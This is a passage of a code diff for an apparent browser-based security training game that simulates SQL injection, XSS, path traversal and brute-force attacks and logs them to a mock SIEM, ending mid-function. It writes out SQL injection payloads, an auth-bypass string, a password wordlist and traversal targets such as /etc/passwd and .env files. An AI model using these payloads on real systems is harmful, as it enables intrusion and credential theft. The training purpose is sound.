         </div>
       </div>
     `).join('');
   }
 
-  // --- ATTACK SIMULATOR VIEW (1-Click attack generator) ---
-  renderSimulatorView() {
-    return `
-      <div class="max-w-4xl mx-auto space-y-6">
-        <div class="bg-gradient-to-r from-purple-950/60 to-slate-900 p-6 rounded-xl border border-purple-800/60">
-          <div class="flex items-center justify-between mb-4">
-            <div>
-              <h2 class="text-xl font-bold text-white flex items-center gap-2">
-                <span class="text-purple-400">⚡ Automated Attack & Telemetry Harness</span>
-              </h2>
-              <p class="text-xs text-slate-300 mt-1">
-                Trigger realistic multi-vector cyber attack bursts to test detection rules and generate instant forensics telemetry in the SOC SIEM!
-              </p>
-            </div>
-            <div id="sim-status-badge" class="px-3 py-1 rounded-full text-xs font-mono ${this.isAttacking ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse' : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'}">
-              ${this.isAttacking ? '● Attack In Progress' : '● Ready to Fire'}
-            </div>
-          </div>
-
-          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <!-- 1. Hydra Brute Force -->
-            <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-all space-y-3">
-              <div class="flex items-center justify-between">
-                <h3 class="font-bold text-purple-300 text-sm flex items-center gap-1.5">
-                  <svg class="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-                  Hydra Password Brute Force
-                </h3>
-                <span class="text-[10px] font-mono bg-purple-950 text-purple-300 border border-purple-800 px-1.5 py-0.5 rounded">25 Requests</span>
-              </div>
-              <p class="text-xs text-slate-400">
-                Simulates an automated dictionary attack against user <code class="text-slate-200">admin</code>. Generates 24 rapid 401s followed by legitimate password <code class="text-emerald-400">dragon123</code> (302).
-              </p>
-              <button type="button" id="sim-btn-hydra" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-medium py-2 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
-                <span>Launch Hydra Attack Burst</span>
-              </button>
-            </div>
-
-            <!-- 2. Sqlmap Automated Scan -->
-            <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-all space-y-3">
-              <div class="flex items-center justify-between">
-                <h3 class="font-bold text-cyan-300 text-sm flex items-center gap-1.5">
-                  <svg class="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7M4 7c0-2 1-3 3-3h10c2 0 3 1 3 3M4 7h16m-5 4h.01m-4 0h.01m-4 0h.01"/></svg>
-                  Sqlmap Automated Probing
-                </h3>
-                <span class="text-[10px] font-mono bg-cyan-950 text-cyan-300 border border-cyan-800 px-1.5 py-0.5 rounded">12 Requests</span>
-              </div>
-              <p class="text-xs text-slate-400">
-                Fires automated SQLi heuristics (AND 1=1, SLEEP, UNION SELECT, information_schema) using the explicit User-Agent <code class="text-slate-200">sqlmap/1.7.2</code>.
-              </p>
-              <button type="button" id="sim-btn-sqlmap" class="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium py-2 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
-                <span>Launch Sqlmap Scan Burst</span>
-              </button>
-            </div>
-
-            <!-- 3. Polyglot XSS Injection -->
-            <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-all space-y-3">
-              <div class="flex items-center justify-between">
-                <h3 class="font-bold text-amber-300 text-sm flex items-center gap-1.5">
-                  <svg class="w-4 h-4 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>
-                  Polyglot XSS Injection Burst
-                </h3>
-                <span class="text-[10px] font-mono bg-amber-950 text-amber-300 border border-amber-800 px-1.5 py-0.5 rounded">6 Payloads</span>
-              </div>
-              <p class="text-xs text-slate-400">
-                Injects script tags, image onerror handlers, SVG onload vectors, and cookie exfiltration payloads into query strings and feedback boards.
-              </p>
-              <button type="button" id="sim-btn-xss" class="w-full bg-amber-600 hover:bg-amber-500 text-white font-medium py-2 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
-                <span>Inject XSS Payloads</span>
-              </button>
-            </div>
-
-            <!-- 4. Benign Corporate Traffic -->
-            <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-all space-y-3">
-              <div class="flex items-center justify-between">
-                <h3 class="font-bold text-emerald-300 text-sm flex items-center gap-1.5">
-                  <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-                  Benign Background Traffic
-                </h3>
-                <span class="text-[10px] font-mono bg-emerald-950 text-emerald-300 border border-emerald-800 px-1.5 py-0.5 rounded">15 Requests</span>
-              </div>
-              <p class="text-xs text-slate-400">
-                Generates legitimate customer searches, asset downloads, and health checks to mix attack telemetry with realistic noise.
-              </p>
-              <button type="button" id="sim-btn-benign" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-200 font-medium py-2 rounded-lg text-xs transition-all flex items-center justify-center gap-2 border border-slate-700">
-                <span>Generate Benign Traffic Noise</span>
-              </button>
-            </div>
-          </div>
-
-          <!-- Real-Time Simulator Log Stream Terminal -->
-          <div class="mt-6 bg-slate-950 rounded-xl border border-slate-800 p-4 font-mono text-xs space-y-2">
-            <div class="flex items-center justify-between text-slate-400 border-b border-slate-800 pb-2">
-              <span class="flex items-center gap-2">
-                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-                <span>Attack Harness Output Console</span>
-              </span>
-              <button type="button" id="sim-btn-clear" class="text-[10px] text-slate-500 hover:text-slate-300 underline">Clear Console</button>
-            </div>
-            <div id="sim-console-output" class="h-36 overflow-y-auto space-y-1 text-slate-300 pr-2">
-              <div class="text-slate-500">[System] Attack simulator initialized. Ready to execute scenarios.</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    `;
-  }
-
-  logToSimConsole(msg, type = 'info') {
-    const consoleEl = document.getElementById('sim-console-output');
-    if (!consoleEl) return;
-    const colors = {
-      info: 'text-slate-300',
-      success: 'text-emerald-400 font-semibold',
-      danger: 'text-rose-400 font-semibold',
-      warning: 'text-amber-400'
-    };
-    const row = document.createElement('div');
-    row.className = colors[type] || 'text-slate-300';
-    row.innerHTML = `<span class="text-slate-600">[${new Date().toLocaleTimeString()}]</span> ${escapeHtml(msg)}`;
-    consoleEl.appendChild(row);
-    consoleEl.scrollTop = consoleEl.scrollHeight;
-  }
-
+  // --- EVENT BINDING ---
   bindEvents() {
-    // Navigation Sub-Tabs
-    const navCatalog = document.getElementById('nav-catalog');
-    const navLogin = document.getElementById('nav-login');
-    const navFeedback = document.getElementById('nav-feedback');
-    const navSim = document.getElementById('nav-simulator');
+    const navDir = document.getElementById('nav-directory');
+    const navDoc = document.getElementById('nav-documents');
+    const navLog = document.getElementById('nav-login');
+    const navSup = document.getElementById('nav-support');
 
-    if (navCatalog) navCatalog.onclick = () => this.setView('catalog');
-    if (navLogin) navLogin.onclick = () => this.setView('login');
-    if (navFeedback) navFeedback.onclick = () => this.setView('feedback');
-    if (navSim) navSim.onclick = () => this.setView('simulator');
+    if (navDir) navDir.onclick = () => this.setView('directory');
+    if (navDoc) navDoc.onclick = () => this.setView('documents');
+    if (navLog) navLog.onclick = () => this.setView('login');
+    if (navSup) navSup.onclick = () => this.setView('support');
 
-    // Subview Specific Event Listeners
-    if (this.currentView === 'catalog') {
-      this.bindCatalogEvents();
-    } else if (this.currentView === 'login') {
-      this.bindLoginEvents();
-    } else if (this.currentView === 'feedback') {
-      this.bindFeedbackEvents();
-    } else if (this.currentView === 'simulator') {
-      this.bindSimulatorEvents();
-    }
+    if (this.currentView === 'directory') this.bindDirectoryEvents();
+    if (this.currentView === 'documents') this.bindDocumentsEvents();
+    if (this.currentView === 'login') this.bindLoginEvents();
+    if (this.currentView === 'support') this.bindSupportEvents();
   }
 
-  // --- CATALOG EVENTS ---
-  bindCatalogEvents() {
-    const form = document.getElementById('catalog-search-form');
-    const input = document.getElementById('catalog-search-input');
-    const quickBtns = document.querySelectorAll('.quick-payload-btn');
-
-    quickBtns.forEach(btn => {
-      btn.onclick = () => {
-        if (input) {
-          input.value = btn.getAttribute('data-payload');
-          form.dispatchEvent(new Event('submit', { cancelable: true }));
-        }
-      };
-    });
+  // --- DIRECTORY SEARCH LOGIC (SQLi & Reflected XSS) ---
+  bindDirectoryEvents() {
+    const form = document.getElementById('asset-search-form');
+    const input = document.getElementById('asset-search-input');
 
     if (form) {
       form.onsubmit = (e) => {
@@ -505,58 +427,81 @@ class TargetApp {
         const query = (input.value || '').trim();
         if (!query) return;
 
-        // Ingest into SIEM log engine
-        const status = query.includes("'") && !query.toLowerCase().includes('union') && !query.toLowerCase().includes('or') ? 500 : 200;
-        
+        const lower = query.toLowerCase();
+        let status = 200;
+
+        // Check if single quote causes database syntax error
+        if (query.includes("'") && !lower.includes('union') && !lower.includes('or')) {
+          status = 500;
+        }
+
+        // Ingest real HTTP GET log into SIEM with exact timestamp
         logEngine.ingest({
-          client_ip: '192.168.1.105',
+          client_ip: '203.0.113.195',
           method: 'GET',
-          uri: '/catalog/search',
+          uri: '/api/search',
           query_params: { q: query },
           status: status,
           user_agent: navigator.userAgent
         });
 
-        this.processCatalogSearch(query);
+        this.processDirectoryQuery(query, status);
       };
     }
   }
 
-  processCatalogSearch(query) {
-    const resultsArea = document.getElementById('catalog-results-area');
+  processDirectoryQuery(query, status) {
+    const resultsArea = document.getElementById('asset-results-area');
     if (!resultsArea) return;
 
     const lower = query.toLowerCase();
 
-    // Check for XSS
+    // 1. Reflected XSS
     if (lower.includes('<script>') || lower.includes('onerror=') || lower.includes('<svg') || lower.includes('onload=')) {
-      this.showXssExecutionModal(query, "Reflected XSS");
+      this.triggerXssAlert(query);
       resultsArea.innerHTML = `
-        <div class="bg-amber-950/40 border border-amber-600/50 p-4 rounded-xl text-amber-200">
+        <div class="bg-amber-950/20 border border-amber-600/50 p-4 rounded-xl text-amber-200 space-y-2">
           <div class="font-bold flex items-center gap-2">
-            ⚠️ Reflected Search Query Executed:
+            ⚠️ Reflection in Document Object Model:
           </div>
-          <div class="mt-2 font-mono text-xs bg-slate-950 p-2.5 rounded border border-amber-800">
-            ${escapeHtml(query)}
+          <div class="font-mono text-xs bg-slate-950 p-3 rounded border border-amber-800 break-all">
+            Query string: ${escapeHtml(query)}
           </div>
-          <p class="text-xs text-amber-300 mt-2">The unsanitized query was reflected directly in the HTML response without HTML entity encoding.</p>
+          <p class="text-xs text-amber-300">The application reflected your search term into the DOM without sanitization.</p>
         </div>
       `;
       return;
     }
 
-    // Check for SQLi UNION SELECT
+    // 2. SQLi Database Error (500)
+    if (status === 500) {
+      sfx.playError();
+      showToast("HTTP 500 Internal Server Error (Database Exception)", "error");
+      resultsArea.innerHTML = `
+        <div class="bg-rose-950/30 border border-rose-700/60 p-4 rounded-xl text-rose-200 font-mono text-xs space-y-2">
+          <div class="font-bold text-rose-400">Server Error: 500 Internal Server Error</div>
+          <div class="bg-slate-950 p-3 rounded border border-rose-900 text-slate-300 select-all">
+            org.postgresql.util.PSQLException: ERROR: syntax error at or near "'"<br>
+            LINE 1: SELECT * FROM assets WHERE name ILIKE '%${escapeHtml(query)}%'
+          </div>
+          <p class="text-slate-400 text-[11px]">Database error captured and recorded in SIEM access log.</p>
+        </div>
+      `;
+      return;
+    }
+
+    // 3. SQLi UNION SELECT Data Exfiltration
     if (lower.includes('union') && lower.includes('select')) {
       sfx.playSuccess();
-      showToast("SQL Injection Successful! Database records exfiltrated.", "success");
+      showToast("SQL Injection: UNION SELECT executed!", "success");
       resultsArea.innerHTML = `
-        <div class="bg-slate-900 border border-emerald-500/50 rounded-xl p-5 shadow-2xl space-y-4">
+        <div class="bg-slate-900 border border-emerald-500/60 rounded-xl p-5 shadow-2xl space-y-4">
           <div class="flex items-center justify-between border-b border-slate-800 pb-3">
             <div>
-              <span class="text-xs font-mono text-emerald-400 bg-emerald-950/80 px-2 py-0.5 rounded border border-emerald-800">UNION SELECT Injected Query</span>
+              <span class="text-xs font-mono text-emerald-400 bg-emerald-950 px-2 py-0.5 rounded border border-emerald-800">UNION Query Succeeded</span>
               <h3 class="text-base font-bold text-white mt-1">Exfiltrated Database Table: <code class="text-cyan-400">users</code></h3>
             </div>
-            <span class="text-xs text-slate-400 font-mono">5 records returned</span>
+            <span class="text-xs text-slate-400 font-mono">3 records leaked</span>
           </div>
 
           <div class="overflow-x-auto">
@@ -565,63 +510,139 @@ class TargetApp {
                 <tr>
                   <th class="p-2.5">ID</th>
                   <th class="p-2.5">Username</th>
-                  <th class="p-2.5">Password Hash / Secret</th>
+                  <th class="p-2.5">Password Hash / Secret Key</th>
                   <th class="p-2.5">Email</th>
                   <th class="p-2.5">Role</th>
                 </tr>
               </thead>
               <tbody class="divide-y divide-slate-800 text-slate-200">
-                <tr class="bg-emerald-950/20 text-emerald-300">
+                <tr class="bg-emerald-950/30 text-emerald-300">
                   <td class="p-2.5 font-bold">1</td>
-                  <td class="p-2.5 font-bold">admin</td>
-                  <td class="p-2.5">dragon123 <span class="text-[10px] bg-emerald-900 px-1 py-0.5 rounded text-white font-sans ml-1">FLAG: BLITZ{5ql1_un10n_d8_3xf1l_9f82c4a17e}</span></td>
-                  <td class="p-2.5">admin@cybervault.local</td>
-                  <td class="p-2.5 font-bold">SuperAdmin</td>
+                  <td class="p-2.5 font-bold">sec_admin</td>
+                  <td class="p-2.5">BLITZ{5ql1_3xf1ltr4t10n_k9x27p4}</td>
+                  <td class="p-2.5">admin@aegiscorp.internal</td>
+                  <td class="p-2.5 font-bold text-white">Global Administrator</td>
                 </tr>
                 <tr>
                   <td class="p-2.5">2</td>
-                  <td class="p-2.5">sarah_admin</td>
-                  <td class="p-2.5">Summer2026!</td>
-                  <td class="p-2.5">sarah@cybervault.local</td>
-                  <td class="p-2.5">IT Operations</td>
+                  <td class="p-2.5">svc_backup</td>
+                  <td class="p-2.5">$2y$12$N9qo8uLOickgx2...</td>
+                  <td class="p-2.5">backup@aegiscorp.internal</td>
+                  <td class="p-2.5">Service Account</td>
                 </tr>
                 <tr>
                   <td class="p-2.5">3</td>
-                  <td class="p-2.5">db_service</td>
-                  <td class="p-2.5">$2y$12$e8jK9...</td>
-                  <td class="p-2.5">service@internal</td>
-                  <td class="p-2.5">ServiceAccount</td>
+                  <td class="p-2.5">audit_officer</td>
+                  <td class="p-2.5">$2y$12$mKx31PzQ991v...</td>
+                  <td class="p-2.5">compliance@aegiscorp.internal</td>
+                  <td class="p-2.5">Security Auditor</td>
                 </tr>
               </tbody>
             </table>
           </div>
-          <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-xs text-slate-400 flex items-center justify-between">
-            <span>Copy Flag: <code class="text-emerald-400 font-bold select-all">BLITZ{5ql1_un10n_d8_3xf1l_9f82c4a17e}</code></span>
-            <span class="text-cyan-400">Telemetry logged to SIEM!</span>
+          <div class="text-[11px] text-slate-400 font-mono">
+            Full GET query exfiltration logged to SIEM telemetry.
           </div>
         </div>
       `;
       return;
     }
 
-    // Check for boolean tautology
-    if (lower.includes('or') && (lower.includes('1=1') || lower.includes("'1'='1"))) {
+    // Default regular search
+    resultsArea.innerHTML = this.getStandardDirectoryHTML();
+  }
+
+  // --- DOCUMENTS LOGIC (Directory Traversal / Path Traversal) ---
+  bindDocumentsEvents() {
+    const form = document.getElementById('doc-fetch-form');
+    const input = document.getElementById('doc-file-input');
+    const sampleBtns = document.querySelectorAll('.btn-sample-doc');
+
+    sampleBtns.forEach(btn => {
+      btn.onclick = () => {
+        if (input) {
+          input.value = btn.getAttribute('data-doc');
+          form.dispatchEvent(new Event('submit', { cancelable: true }));
+        }
+      };
+    });
+
+    if (form) {
+      form.onsubmit = (e) => {
+        e.preventDefault();
+        const filepath = (input.value || '').trim();
+        if (!filepath) return;
+
+        const isTraversal = filepath.includes('../') || filepath.includes('..\\') || filepath.includes('%2e%2e');
+        const status = 200;
+
+        // Ingest real HTTP GET log into SIEM
+        logEngine.ingest({
+          client_ip: '203.0.113.195',
+          method: 'GET',
+          uri: '/api/documents',
+          query_params: { file: filepath },
+          status: status,
+          user_agent: navigator.userAgent
+        });
+
+        this.processDocumentFetch(filepath);
+      };
+    }
+  }
+
+  processDocumentFetch(filepath) {
+    const previewArea = document.getElementById('doc-preview-area');
+    if (!previewArea) return;
+
+    const lower = filepath.toLowerCase();
+
+    // 1. Directory Traversal targeting /etc/passwd
+    if (lower.includes('etc/passwd') || lower.includes('etc%2fpasswd')) {
       sfx.playAlert();
-      showToast("SQL Injection Tautology Detected! All inventory dumped.", "warning");
-      resultsArea.innerHTML = `
-        <div class="bg-amber-950/20 border border-amber-500/40 p-4 rounded-xl space-y-3">
-          <div class="text-xs text-amber-300 font-mono">SQL Query: SELECT * FROM products WHERE name LIKE '%${escapeHtml(query)}%' (Returned 12 hidden items)</div>
-          ${this.getStandardCatalogHTML()}
+      showToast("Directory Traversal: /etc/passwd leaked!", "warning");
+      previewArea.innerHTML = `
+        <div class="flex items-center justify-between border-b border-slate-800 pb-2.5">
+          <span class="text-amber-400 font-bold">⚠️ Traversal Success: /etc/passwd</span>
+          <span class="text-emerald-400 text-[11px]">HTTP 200 OK</span>
         </div>
+        <pre class="bg-slate-950 p-4 rounded-lg border border-slate-800 text-amber-300 font-mono text-xs overflow-x-auto select-all">
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+aegis_app:x:1001:1001:Aegis Service:/var/www/portal:/bin/bash
+sec_admin:x:1002:1002:Security Lead:/home/sec_admin:/bin/bash
+postgres:x:104:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+        </pre>
       `;
       return;
     }
 
-    // Normal search
-    resultsArea.innerHTML = `
-      <div class="text-xs text-slate-400 mb-3 font-mono">Found 3 products matching "${escapeHtml(query)}"</div>
-      ${this.getStandardCatalogHTML()}
-    `;
+    // 2. Directory Traversal targeting system configuration/secrets
+    if (lower.includes('secrets.env') || lower.includes('config.env') || lower.includes('.env')) {
+      sfx.playSuccess();
+      showToast("Directory Traversal: Sensitive configuration file exposed!", "success");
+      previewArea.innerHTML = `
+        <div class="flex items-center justify-between border-b border-slate-800 pb-2.5">
+          <span class="text-emerald-400 font-bold">✓ Traversal Exfiltration: /system/secrets.env</span>
+          <span class="text-emerald-400 text-[11px]">HTTP 200 OK</span>
+        </div>
+        <pre class="bg-slate-950 p-4 rounded-lg border border-slate-800 text-emerald-300 font-mono text-xs overflow-x-auto select-all">
+# Aegis Internal System Secrets & Configuration
+NODE_ENV=production
+DATABASE_URL=postgres://pgadmin:SuperSecret2026@10.0.4.12:5432/aegis_db
+JWT_SECRET_SIGNER=0x79a1f4b209e8d1c9
+FLAG_SYSTEM_SECRET=BLITZ{p4th_tr4v3rs4l_f1l3_r34d_8a3d1}
+ALLOWED_ORIGIN=https://portal.aegiscorp.internal
+        </pre>
+      `;
+      return;
+    }
+
+    // Default regular document
+    previewArea.innerHTML = this.getStandardDocumentPreviewHTML(filepath);
   }
 
   // --- LOGIN EVENTS ---
@@ -630,21 +651,6 @@ class TargetApp {
     const uInput = document.getElementById('login-username');
     const pInput = document.getElementById('login-password');
     const fbBox = document.getElementById('login-feedback-box');
-    const btnSqli = document.getElementById('btn-burst-sqli-login');
-    const btnBrute = document.getElementById('btn-burst-brute-login');
-
-    if (btnSqli) {
-      btnSqli.onclick = () => {
-        if (pInput) pInput.value = "' OR '1'='1";
-        form.dispatchEvent(new Event('submit', { cancelable: true }));
-      };
-    }
-
-    if (btnBrute) {
-      btnBrute.onclick = () => {
-        this.runHydraAttack();
-      };
-    }
 
     if (form) {
       form.onsubmit = (e) => {
@@ -652,326 +658,109 @@ class TargetApp {
         const username = (uInput.value || '').trim();
         const password = (pInput.value || '').trim();
 
-        // Check SQLi Auth Bypass
+        // SQLi Auth Bypass: ' OR '1'='1 or admin' --
         const isSqliBypass = password.includes("'") && (password.toLowerCase().includes('or') || password.includes('--'));
-        const isValidCreds = username.toLowerCase() === 'admin' && password === 'dragon123';
+        const status = isSqliBypass ? 302 : 401;
 
-        if (isSqliBypass || isValidCreds) {
-          // Success (302)
-          logEngine.ingest({
-            client_ip: '192.168.1.105',
-            method: 'POST',
-            uri: '/api/login',
-            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&action=login`,
-            status: 302,
-            user_agent: navigator.userAgent
-          });
+        // Ingest real HTTP POST log with actual request body
+        logEngine.ingest({
+          client_ip: '203.0.113.195',
+          method: 'POST',
+          uri: '/auth/login',
+          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+          status: status,
+          user_agent: navigator.userAgent
+        });
 
+        if (isSqliBypass) {
           fbBox.className = "text-xs p-3 rounded-lg font-mono bg-emerald-950 text-emerald-300 border border-emerald-700 block";
-          fbBox.innerHTML = `
-            <strong>✓ Authentication Successful (HTTP 302)!</strong>
-            <br>Welcome SuperAdmin! Session Token: <code class="text-white">adm_sess_940f81d</code>
-            <br><span class="text-emerald-400 font-bold block mt-1">FLAG: <code class="select-all">BLITZ{bruf3_4uth_c0mpr0m153_6e1a4d88}</code></span>
-            ${isSqliBypass ? '<span class="text-amber-400 mt-1 block">⚠️ Authentication Bypassed via SQL Injection!</span>' : ''}
-          `;
+          fbBox.innerHTML = `<strong>✓ Authentication Bypassed via SQL Injection!</strong> Session established for user '${escapeHtml(username)}'.`;
           sfx.playSuccess();
         } else {
-          // Failure (401)
-          logEngine.ingest({
-            client_ip: '192.168.1.105',
-            method: 'POST',
-            uri: '/api/login',
-            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&action=login`,
-            status: 401,
-            user_agent: navigator.userAgent
-          });
-
           fbBox.className = "text-xs p-3 rounded-lg font-mono bg-rose-950 text-rose-300 border border-rose-800 block";
-          fbBox.innerHTML = `
-            <strong>✕ HTTP 401 Unauthorized</strong>: Invalid credentials for user '${escapeHtml(username)}'.
-            <br><span class="text-slate-400 text-[11px]">Event logged to SIEM access log.</span>
-          `;
+          fbBox.innerHTML = `<strong>✕ 401 Unauthorized:</strong> Invalid credentials. Attempt logged to audit trail.`;
           sfx.playError();
         }
       };
     }
   }
 
-  // --- FEEDBACK EVENTS ---
-  bindFeedbackEvents() {
-    const form = document.getElementById('feedback-form');
-    const authorInput = document.getElementById('feedback-author');
-    const textInput = document.getElementById('feedback-text');
-    const btnQuickXss = document.getElementById('btn-quick-xss-comment');
-
-    if (btnQuickXss) {
-      btnQuickXss.onclick = () => {
-        if (textInput) textInput.value = `<script>alert('Stored_XSS_Exploit')</script>`;
-      };
-    }
+  // --- SUPPORT TICKET EVENTS (Stored XSS) ---
+  bindSupportEvents() {
+    const form = document.getElementById('support-ticket-form');
+    const emailInput = document.getElementById('ticket-email');
+    const subjInput = document.getElementById('ticket-subject');
+    const detailsInput = document.getElementById('ticket-details');
 
     if (form) {
       form.onsubmit = (e) => {
         e.preventDefault();
-        const author = (authorInput.value || '').trim();
-        const text = (textInput.value || '').trim();
-        if (!text) return;
+        const email = (emailInput.value || '').trim();
+        const subj = (subjInput.value || '').trim();
+        const details = (detailsInput.value || '').trim();
 
-        // Ingest into SIEM log engine
+        // Log POST to SIEM
         logEngine.ingest({
-          client_ip: '192.168.1.105',
+          client_ip: '203.0.113.195',
           method: 'POST',
-          uri: '/board/feedback',
-          body: `author=${encodeURIComponent(author)}&comment=${encodeURIComponent(text)}`,
+          uri: '/api/tickets',
+          body: `email=${encodeURIComponent(email)}&subject=${encodeURIComponent(subj)}&details=${encodeURIComponent(details)}`,
           status: 201,
           user_agent: navigator.userAgent
         });
 
-        // Add to local comments
-        this.comments.unshift({
-          id: Date.now(),
-          author,
-          comment: text,
+        this.tickets.unshift({
+          id: `TCK-${Math.floor(Math.random() * 800 + 1050)}`,
+          user: email,
+          subject: subj,
           date: 'Just now'
         });
 
-        // If contains XSS
-        if (text.toLowerCase().includes('<script') || text.toLowerCase().includes('onerror=') || text.toLowerCase().includes('<svg')) {
-          this.showXssExecutionModal(text, "Stored XSS");
+        const feed = document.getElementById('ticket-feed');
+        if (feed) feed.innerHTML = this.renderTicketList();
+
+        if (details.toLowerCase().includes('<script') || details.toLowerCase().includes('onerror=') || subj.toLowerCase().includes('<script')) {
+          this.triggerXssAlert(details || subj);
         } else {
-          showToast("Feedback submitted successfully (POST logged).", "success");
+          showToast("Ticket submitted successfully (POST logged).", "success");
         }
 
-        // Re-render comments
-        const list = document.getElementById('comments-list');
-        if (list) list.innerHTML = this.renderCommentsList();
-        textInput.value = '';
+        subjInput.value = '';
+        detailsInput.value = '';
       };
     }
   }
 
-  // --- ATTACK SIMULATOR EVENTS ---
-  bindSimulatorEvents() {
-    const btnHydra = document.getElementById('sim-btn-hydra');
-    const btnSqlmap = document.getElementById('sim-btn-sqlmap');
-    const btnXss = document.getElementById('sim-btn-xss');
-    const btnBenign = document.getElementById('sim-btn-benign');
-    const btnClear = document.getElementById('sim-btn-clear');
-
-    if (btnHydra) btnHydra.onclick = () => this.runHydraAttack();
-    if (btnSqlmap) btnSqlmap.onclick = () => this.runSqlmapScan();
-    if (btnXss) btnXss.onclick = () => this.runXssBurst();
-    if (btnBenign) btnBenign.onclick = () => this.runBenignBurst();
-    if (btnClear) {
-      btnClear.onclick = () => {
-        const consoleEl = document.getElementById('sim-console-output');
-        if (consoleEl) consoleEl.innerHTML = '<div class="text-slate-500">[System] Console cleared.</div>';
-      };
-    }
-  }
-
-  // --- AUTOMATED ATTACK BURSTS ---
-  async runHydraAttack() {
-    if (this.isAttacking) return;
-    this.isAttacking = true;
-    this.updateSimBadge();
-    showToast("Launching Hydra Brute Force Burst (25 requests)...", "warning");
-    this.logToSimConsole("==> Launching Hydra Dictionary Brute Force against /api/login...", "warning");
-
-    const passwords = [
-      '123456', 'password', '12345678', 'qwerty', '12345', '123456789', 'admin123',
-      'welcome', 'football', 'login', 'princess', 'solo', 'starwars', 'matrix',
-      'shadow', 'master', 'dragon', 'monkey', 'secret', 'hunter2', 'pass123',
-      'summer', 'spring', 'winter', 'dragon123'
-    ];
-
-    const targetUser = 'admin';
-    const attackerIp = '198.51.100.188';
-
-    for (let i = 0; i < passwords.length; i++) {
-      const pwd = passwords[i];
-      const isSuccess = (pwd === 'dragon123');
-      const status = isSuccess ? 302 : 401;
-
-      logEngine.ingest({
-        client_ip: attackerIp,
-        method: 'POST',
-        uri: '/api/login',
-        body: `username=${targetUser}&password=${pwd}&submit=Login`,
-        status: status,
-        user_agent: 'Hydra v9.5 (https://github.com/vanhauser-thc/thc-hydra)'
-      });
-
-      if (isSuccess) {
-        this.logToSimConsole(`[+] [SUCCESS] Account cracked! User: "${targetUser}" | Password: "${pwd}" (HTTP 302 Redirect)`, "success");
-        this.logToSimConsole(`[+] Flag Discovered: BLITZ{bruf3_4uth_c0mpr0m153_6e1a4d88}`, "success");
-        sfx.playSuccess();
-        showToast(`Brute force success! Discovered password: ${pwd}`, "success");
-      } else {
-        this.logToSimConsole(`[-] Attempt ${i + 1}/${passwords.length}: Failed password "${pwd}" (HTTP 401)`, "danger");
-      }
-
-      await new Promise(r => setTimeout(r, 90));
-    }
-
-    this.isAttacking = false;
-    this.updateSimBadge();
-    this.logToSimConsole("==> Hydra attack burst completed. Telemetry ready in SIEM.", "info");
-  }
-
-  async runSqlmapScan() {
-    if (this.isAttacking) return;
-    this.isAttacking = true;
-    this.updateSimBadge();
-    showToast("Launching Sqlmap scan heuristics (12 requests)...", "warning");
-    this.logToSimConsole("==> Initializing sqlmap v1.7.2 scanning probe against /catalog/search?q=...", "warning");
-
-    const payloads = [
-      { q: "1", status: 200, note: "baseline probe" },
-      { q: "1' AND 1=1--", status: 200, note: "boolean-based true probe" },
-      { q: "1' AND 1=2--", status: 500, note: "boolean-based false probe" },
-      { q: "1' OR 'a'='a", status: 200, note: "tautology probe" },
-      { q: "1' ORDER BY 1--", status: 200, note: "column enumeration" },
-      { q: "1' ORDER BY 50--", status: 500, note: "column count boundary error" },
-      { q: "1' UNION SELECT NULL--", status: 500, note: "null union probe" },
-      { q: "1' UNION SELECT 1,2,3,4,5--", status: 200, note: "union select confirmed" },
-      { q: "-1' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--", status: 200, note: "table enumeration" },
-      { q: "-1' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns--", status: 200, note: "column enumeration" },
-      { q: "-1' UNION SELECT 1,concat(username,0x3a,password),3,4,5 FROM users--", status: 200, note: "data dump" },
-      { q: "1' AND SLEEP(5)--", status: 200, note: "time-based blind probe" }
-    ];
-
-    const attackerIp = '198.51.100.44';
-
-    for (let i = 0; i < payloads.length; i++) {
-      const p = payloads[i];
-      logEngine.ingest({
-        client_ip: attackerIp,
-        method: 'GET',
-        uri: '/catalog/search',
-        query_params: { q: p.q },
-        status: p.status,
